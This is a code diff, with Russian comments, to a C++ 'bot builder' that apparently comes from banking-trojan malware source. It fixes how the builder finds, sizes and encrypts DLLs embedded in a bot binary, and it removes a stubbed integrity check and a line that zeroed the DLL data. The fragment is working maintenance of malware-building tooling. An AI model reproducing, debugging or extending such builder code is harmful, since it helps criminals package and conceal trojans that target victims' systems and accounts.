@@ -1235,28 +1235,27 @@ void TBotBuilder::InitializeDLLsEncryptors(LPBYTE Buf, DWORD BufSize)
 {
 	if (!EncryptDlls) return;
 
+	LPBYTE StartPtr = Buf;
 	while (true)
 	{
 		// Определяем позицию DLL в буфере
-		int Pos = STR::Pos(Buf, ENCRYPTED_DLL_MARKER, BufSize, true);
+		int Pos = STR::Pos(Buf, ENCRYPTED_DLL_MARKER, BufSize - (Buf - StartPtr), true);
 		if (Pos < 0) break;
 
 		// Запоминаем начало маркера
 		PCHAR MarkerPtr = Buf + Pos;
 
 		// Определяем позицию относительно всего буфера
-		int GlobalPos = MarkerPtr - Buf;
+		int GlobalPos = MarkerPtr - StartPtr;
 
 		// Переходим к длл
 		Buf     += Pos + ENCRYPTED_DLL_MARKER_SIZE;
-		BufSize -= Pos + ENCRYPTED_DLL_MARKER_SIZE;
 
 		// Определяем размер данных
 		DWORD DllSize = *(PDWORD)Buf;
 
 		// Пропускаем данные о размере
 		Buf     += sizeof(DWORD);
-		BufSize -= sizeof(DWORD);
 
 		if (DllSize > BufSize)
 			throw Exception("Нарушение целостности встроенных DLL!\r\nОбратитесь к разработчикам!");
@@ -1264,12 +1263,10 @@ void TBotBuilder::InitializeDLLsEncryptors(LPBYTE Buf, DWORD BufSize)
 
 		// Пропускаем длл
 		Buf     += DllSize;
-		BufSize -= DllSize;
 
 		// Создаём элемент
-		DWORD TotalSize = Buf - MarkerPtr;
+		DWORD TotalSize = ENCRYPTED_DLL_MARKER_SIZE + sizeof(DWORD) + DllSize;
 		TBotDLLEncryptor *Item = new TBotDLLEncryptor(this, GlobalPos, TotalSize);
-		Item->Password = FSessionPassword;
 	}
 
 
@@ -2078,7 +2075,6 @@ bool TBotDLLEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 	Ptr += sizeof(DWORD);
 
 	// Для дальнешего контроля получаем хэш
-	m_memset(Ptr, 0, FDllSize);
 	FHash = STRA::Hash(Ptr, FDllSize, false);
 	// Шифруем данные
 	PCHAR P = FPassword.t_str();
@@ -2095,7 +2091,6 @@ bool TBotDLLEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 //--------------------------------------------------
 bool TBotDLLEncryptor::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
 {
-	return true;
 	if (FPosition < 0 || FDllSize == 0)
 		return false;
 
